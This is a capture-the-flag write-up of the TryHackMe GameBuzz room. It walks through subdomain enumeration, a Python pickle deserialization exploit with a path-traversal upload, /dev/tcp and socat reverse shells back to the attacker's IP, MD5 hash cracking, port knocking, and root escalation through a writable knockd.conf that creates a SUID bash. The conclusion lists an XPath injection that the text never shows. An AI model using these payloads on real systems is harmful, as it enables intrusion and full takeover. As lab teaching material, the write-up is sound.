# GameBuzz

## Introduction

Welcome to my another writeup! In this TryHackMe [GameBuzz](https://tryhackme.com/room/gamebuzz) room, you'll learn: Exploiting insecure deserialization in Python's Pickle library, port knocking and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to dev2](#privilege-escalation)**
4. **[Privilege Escalation: dev2 to dev1](#dev2-to-dev1)**
5. **[Privilege Escalation: dev2 to root](#dev2-to-root)**
6. **[Conclusion](#conclusion)**

## Background

> Part of Incognito CTF
> 
> Difficulty: Hard

---

Part of [Incognito 2.0 CTF](https://ctftime.org/event/1321)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|11:27:19(HKT)]
└> export RHOSTS=10.10.115.32 
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|11:27:30(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Incognito
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

According to `rustscan` result, we have 1 port is opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80                | Apache httpd 2.4.29 ((Ubuntu))|

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|11:29:10(HKT)]
└> echo "$RHOSTS gamebuzz.thm" >> /etc/hosts
```

Home page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124113349.png)

**After poking around the website, I found this is very interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124113834.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124113841.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124113847.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124113900.png)

When we clicked one of those game ratings, it'll send a POST request to `/fetch`, **with parameter `object`.**

By putting the puzzles together, **the `object` parameter and the `.pkl` file extension is for Python's pickle, which is a serialization library.**

In the `/fetch` endpoint, we send file that's pickled (serialized) object. Then, **the backend deserialize our provided pickled object.**

Hmm... **If we can upload our own evil pickled object**, then we might able to gain Remote Code Execution (RCE)!

**In the of the website, we found a new domain:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124123203.png)

**Let's replace our host in `/etc/hosts` to that domain!**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|11:53:50(HKT)]
└> nano /etc/hosts
10.10.115.32 incognito.com
```

**Then, we can enumerate subdomain via `ffuf`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|12:33:56(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://incognito.com/ -H "Host: FUZZ.incognito.com" -fs 20637 -t 100
[...]
dev                     [Status: 200, Size: 57, Words: 5, Lines: 2, Duration: 218ms]
```

- Found subdomain: `dev`

**Then add that subdomain to `/etc/hosts`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|12:33:31(HKT)]
└> nano /etc/hosts
10.10.115.32 incognito.com dev.incognito.com
```

**`dev`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|12:35:55(HKT)]
└> curl http://dev.incognito.com/    
<h1 style="text-align: center;">Only for Developers</h1>
```

Hmm... Developers only.

**Let's check out the `robots.txt` crawler file:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|12:35:56(HKT)]
└> curl http://dev.incognito.com/robots.txt
User-Agent: *
Disallow: /secret
```

- Found hidden directory: `/secret`

**`/secret`:**
```
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|12:36:55(HKT)]
└> curl http://dev.incognito.com/secret/    
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at dev.incognito.com Port 80</address>
</body></html>
```

Hmm... HTTP staus 403 Forbidden.

**Now, we can still enumerate hidden directory:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|12:39:10(HKT)]
└> gobuster dir -u http://dev.incognito.com/secret/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/upload               (Status: 301) [Size: 330] [--> http://dev.incognito.com/secret/upload/]
```

- Found hidden directory in `/secret/`: `/upload/`

**`/upload`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124124038.png)

**View source page:**
```html
<form action="script.php" method="post" enctype="multipart/form-data">
    Upload a File:
    <input type="file" name="the_file" id="fileToUpload">
    <input type="submit" name="submit" value="Start Upload">
</form>
```

When we clicked the "Start Upload" button, it'll send a POST request to `/secret/upload/script.php`, with parameter `the_file`.

## Initial Foothold

Armed with above information, **we can upload our own evil pickled object to the server, then deserialize the pickled object in `/fetch`.**

But first, let's upload a test file:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|12:42:57(HKT)]
└> echo -n 'testing' > test.txt
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124124326.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124124340.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/GameBuzz/images/Pasted%20image%2020230124124351.png)

We successfully uploaded a file. But where does the file lives??

However, I couldn't find the uploaded file.

Maybe we can upload our file to a specific path via **path traversal**?

**To do so, I'll write a Python script to upload and trigger the deserialization payload:**
```py
#!/usr/bin/env python3

import requests
import pickle
import os

class PickleRCE:
    def __reduce__(self):
        return (os.system,("bash -c '/bin/bash -i >& /dev/tcp/10.9.0.253/443 0>&1' ",))


def main():
    uploadURL = 'http://dev.incognito.com/secret/upload/script.php'
    uploadData = {'submit': 'Start Upload'}

    filename = 'evilObject.pkl'
    file = {
        'the_file': (f'../../../../../../../../../var/upload/games/{filename}', pickle.dumps(PickleRCE()))
    }

    uploadRequestResult = requests.post(uploadURL, data=uploadData, files=file)
    print(f'[*] Upload file request:\n{uploadRequestResult.text}')

    pickleURL = 'http://incognito.com/fetch'
    pickleData = {'object': f'/var/upload/games/{filename}'}

    pickleRequestResult = requests.post(pickleURL, json=pickleData)
    print(f'[*] Fetch pickle request:\n{pickleRequestResult.text}')

if __name__ == '__main__':
    main()
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:14:25(HKT)]
└> nc -lnvp 443
listening on [any] 443 ...
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:16:47(HKT)]
└> python3 upload_file.py
[*] Upload file request:
The file evilObject.pkl has been uploaded
[*] Fetch pickle request:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Nope. The path traversal doesn't work.

**After some trial and error, I found that the uploaded file is in `/var/upload/<filename>`:**
```py
    file = {
        'the_file': (f'../../../../../../../../../var/upload/{filename}', pickle.dumps(PickleRCE()))
    }

    pickleData = {'object': f'/var/upload/{filename}'}
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:18:33(HKT)]
└> python3 upload_file.py
[*] Upload file request:
The file evilObject.pkl has been uploaded

```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:14:25(HKT)]
└> nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.115.32] 48784
bash: cannot set terminal process group (916): Inappropriate ioctl for device
bash: no job control in this shell
www-data@incognito:/$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
incognito
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(nosu)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:8b:df:7d:19:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.115.32/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2339sec preferred_lft 2339sec
    inet6 fe80::8b:dfff:fe7d:191f/64 scope link 
       valid_lft forever preferred_lft forever
```

This time it worked!!

I'm user `www-data`!

**user.txt:**
```shell
www-data@incognito:/$ cat /home/dev2/user.txt
{Redacted}
```

**Stable shell via `socat`:**
```shell
┌[root♥siunam]-(/opt/static-binaries/binaries/linux/x86_64)-[2023.01.24|13:20:36(HKT)]-[git://master ✗]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:19:48(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444                
2023/01/24 13:20:40 socat[74118] N opening character device "/dev/pts/1" for reading and writing
2023/01/24 13:20:40 socat[74118] N listening on AF=2 0.0.0.0:4444
```

```shell
www-data@incognito:/$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:19:48(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444                
2023/01/24 13:20:40 socat[74118] N opening character device "/dev/pts/1" for reading and writing
2023/01/24 13:20:40 socat[74118] N listening on AF=2 0.0.0.0:4444
                                                                 2023/01/24 13:21:16 socat[74118] N accepting connection from AF=2 10.10.115.32:54844 on AF=2 10.9.0.253:4444
                                                                  2023/01/24 13:21:16 socat[74118] N starting data transfer loop with FDs [5,5] and [7,7]
                                              www-data@incognito:/$ 
www-data@incognito:/$ export TERM=xterm-256color
www-data@incognito:/$ stty rows 22 columns 107
www-data@incognito:/$ ^C
www-data@incognito:/$ 
```

## Privilege Escalation

### www-data to dev2

Let's do some basic enumerations!

**System users:**
```shell
www-data@incognito:/$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
dev1:x:1001:1001::/home/dev1:/bin/bash
dev2:x:1000:1000:cirius:/home/dev2:/bin/bash
www-data@incognito:/$ ls -lah /home
total 16K
drwxr-xr-x  4 root root 4.0K Mar  1  2021 .
drwxr-xr-x 24 root root 4.0K Aug 11  2021 ..
drwxr-x---  7 dev1 dev1 4.0K Jun 11  2021 dev1
drwxr-xr-x  6 dev2 dev2 4.0K Jun 11  2021 dev2
```

- Found 2 user: `dev1`, `dev2`

**Found secret key in `/var/www/incognito.com/`:**
```shell
www-data@incognito:/$ cat /var/www/incognito.com/incognito.wsgi 
#!/usr/bin/python3
import sys
import logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/incognito.com/incognito/")

from incognito import app as application
application.secret_key = '{Redacted}'
```

**Also, I found that we can Switch User to `dev2` without password!**
```shell
www-data@incognito:/$ su dev2
dev2@incognito:/$ whoami;hostname;id;ip a
dev2
incognito
uid=1000(dev2) gid=1000(dev2) groups=1000(dev2),24(cdrom),30(dip),46(plugdev),1002(nosu)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:8b:df:7d:19:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.115.32/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3516sec preferred_lft 3516sec
    inet6 fe80::8b:dfff:fe7d:191f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `dev2`!

### dev2 to root

```shell
dev2@incognito:/$ cat /var/mail/dev1 
Hey, your password has been changed, {Redacted}.
Knock yourself in!
```

Found `dev1` password!

However, it looks like a password hash.

**Let's crack it:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:42:44(HKT)]
└> hash-identifier '{Redacted}'                                         
[...]
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
[...]

┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:43:35(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 dev1.hash
[...]
{Redacted}         (?)
```

**Cracked! Let's Switch User to `dev1`:**
```shell
dev2@incognito:/$ su dev1
Password: 
su: Permission denied
```

Hmm?

**In the `netstat` command output, we see port 22 is opened:**
```shell
dev2@incognito:/$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.115.32:68         0.0.0.0:*                           - 
```

**Let's try to SSH into it:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:44:01(HKT)]
└> ssh dev1@$RHOSTS                                 
ssh: connect to host 10.10.115.32 port 22: Connection refused
```

Umm...

Let's take a step back.

**In the `dev1`'s mail, we see:**
```
Knock yourself in!
```

Which is referring to port knocking!

**Now, we can check the `/etc/knockd.conf` config file:**
```shell
dev2@incognito:/$ cat /etc/knockd.conf
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 5020,6120,7340
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9000,8000,7000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
	tcpflags    = syn
```

**As you can see, it has 2 port knocking sequences:**

- Open SSH: `5020` -> `6120` -> `7340`
- Close SSH: `9000` -> `8000` -> `7000`

**Armed with above information, we can open the SSH service by knocking port `5020`, `6120`, `7340`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:51:14(HKT)]
└> knock -v $RHOSTS 5020 6120 7340
hitting tcp 10.10.115.32:5020
hitting tcp 10.10.115.32:6120
hitting tcp 10.10.115.32:7340
```

**We now should able to SSH to `dev1`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:52:16(HKT)]
└> ssh dev1@$RHOSTS
dev1@10.10.115.32's password: 
Permission denied, please try again.
```

Wait. Wrong password?

**Maybe the password is the MD5 hash one?**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|13:52:16(HKT)]
└> ssh dev1@$RHOSTS
[...]
dev1@incognito:~$ whoami;hostname;id;ip a
dev1
incognito
uid=1001(dev1) gid=1001(dev1) groups=1001(dev1)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:8b:df:7d:19:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.115.32/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2059sec preferred_lft 2059sec
    inet6 fe80::8b:dfff:fe7d:191f/64 scope link 
       valid_lft forever preferred_lft forever
```

Oh! It's the MD5 hash one!

And I'm user `dev1`!

### dev1 to root

**Sudo permission:**
```shell
dev1@incognito:~$ sudo -l
[sudo] password for dev1: 
Matching Defaults entries for dev1 on incognito:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev1 may run the following commands on incognito:
    (root) /etc/init.d/knockd
```

In user `dev1`, **we can run `/etc/init.d/knockd`startups script as root**!

```shell
dev1@incognito:~$ sudo /etc/init.d/knockd
 * Usage: /etc/init.d/knockd {start|stop|restart|reload|force-reload}
```

**However, we don't have write access to it, so we couldn't swap the `knockd` SH script to our evil script:**
```shell
dev1@incognito:~$ cd /etc/init.d/
dev1@incognito:/etc/init.d$ ls -lah knockd
-rwxr-xr-x 1 root root 1.8K Oct  8  2016 knockd
```

**Hmm... How about `/etc/knockd.conf`?**
```shell
dev1@incognito:/etc/init.d$ ls -lah /etc/knockd.conf
-rw-rw-r--+ 1 root root 349 Jun 11  2021 /etc/knockd.conf
```

We have write access to it!

**Armed with above information, we can modify the `command` key to add a SUID sticky bit to `/bin/bash`:**
```shell
dev1@incognito:/etc/init.d$ nano /etc/knockd.conf 
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 5020,6120,7340
	seq_timeout = 15
	command     = /bin/bash -c 'cp /bin/bash /tmp/root_bash;chmod +s /tmp/root_bash'
	tcpflags    = syn

[closeSSH]
	sequence    = 9000,8000,7000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
	tcpflags    = syn
```

**Then, restart `knockd` and knock port `5020`, `6120`, `7340` again:**
```shell
dev1@incognito:/etc/init.d$ sudo /etc/init.d/knockd restart
[ ok ] Restarting knockd (via systemctl): knockd.service.
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/GameBuzz)-[2023.01.24|14:23:24(HKT)]
└> knock -v $RHOSTS 5020 6120 7340
hitting tcp 10.10.115.32:5020
hitting tcp 10.10.115.32:6120
hitting tcp 10.10.115.32:7340
```

```shell
dev1@incognito:/etc/init.d$ ls -lah /tmp/root_bash 
-rwsr-sr-x 1 root root 1.1M Jan 24 06:25 /tmp/root_bash
```

We did it!

**Let's spawn a root Bash shell!**
```shell
dev1@incognito:/etc/init.d$ /tmp/root_bash -p
root_bash-4.4# whoami;hostname;id;ip a
root
incognito
uid=1001(dev1) gid=1001(dev1) euid=0(root) egid=0(root) groups=0(root),1001(dev1)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:dd:75:6c:fe:03 brd ff:ff:ff:ff:ff:ff
    inet 10.10.115.32/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3270sec preferred_lft 3270sec
    inet6 fe80::dd:75ff:fe6c:fe03/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
root_bash-4.4# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating Subdomain
2. Exploiting Insecure Deserialization In Python's Pickle Lirary
3. Exploiting XPath Injection In Login Page
4. Port Knocking
5. Horizontal Privilege Escalation Via Misconfigurated `/etc/knockd.conf` File